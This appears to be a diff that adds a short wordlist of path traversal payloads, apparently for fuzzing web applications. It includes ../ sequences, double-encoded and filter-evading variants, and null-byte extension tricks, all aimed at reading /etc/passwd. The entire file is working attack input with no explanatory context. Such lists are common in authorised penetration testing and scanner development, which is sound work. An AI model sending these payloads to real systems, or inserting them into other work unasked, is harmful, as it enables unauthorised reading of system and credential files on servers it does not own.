@@ -1,0 +1,9 @@
+../../../
+/etc/passwd
+....//....//....//
+..%252F..%252F..%252F
+/var/www/images/../../../etc/passwd
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.png
+../../../etc/passwd%00.svg
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%0016.jpg
